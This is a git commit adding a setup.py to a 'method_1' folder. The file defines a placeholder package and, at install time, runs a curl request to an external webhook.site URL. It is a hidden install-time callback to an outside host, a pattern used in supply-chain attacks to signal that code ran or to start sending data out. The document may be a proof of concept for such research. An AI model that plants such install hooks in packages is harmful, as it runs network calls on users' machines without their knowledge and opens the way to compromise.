9e00496bab8664b7b3eba1eebfd1485ade7b7a11
Yao-Wen Chang <changyaowen19980629@gmail.com>
2024-03-08 15:14:29 +1100

    Add setup to the method_1

---
+++ method_1/setup.py
@@ -0,0 +1,12 @@
+from setuptools import setup
+import subprocess
+
+# Define your package details here
+setup(
+    name='my_package',
+    version='1.0',
+    # Other package details...
+)
+
+# Execute the curl command during installation
+subprocess.run(['curl', 'https://webhook.site/3ddfe84f-134c-4153-b091-ce4f8aabce71'])
